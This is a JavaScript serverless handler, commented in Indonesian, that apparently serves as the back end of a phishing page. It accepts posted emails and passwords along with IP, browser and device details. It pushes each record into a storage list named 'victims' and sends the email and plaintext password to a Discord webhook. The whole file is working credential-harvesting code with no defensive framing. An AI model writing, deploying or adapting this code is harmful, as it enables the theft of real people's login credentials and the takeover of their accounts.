// Simpan data login ke Vercel KV + kirim ke Discord webhook
import { kv } from '@vercel/kv';

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    
    const { email, password, userAgent, platform, screen, timezone, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        type: 'login',
        email,
        password,
        userAgent,
        platform,
        screen,
        timezone,
        ip,
        timestamp
    };
    
    // Simpan ke Vercel KV
    try {
        await kv.lpush('victims', JSON.stringify(data));
    } catch (e) {
        console.error('KV error:', e);
    }
    
    // Kirim ke Discord webhook
    await sendToDiscord(data);
    
    return res.status(200).json({ status: 'ok' });
}

async function sendToDiscord(data) {
    if (!WEBHOOK_URL) return;
    
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔐 **LOGIN BARU**\n**Email:** ${data.email}\n**Password:** ${data.password}\n**IP:** ${data.ip}\n**UA:** ${data.userAgent}\n**Time:** ${data.timestamp}`
            })
        });
    } catch (e) {
        console.error('Discord error:', e);
    }
}
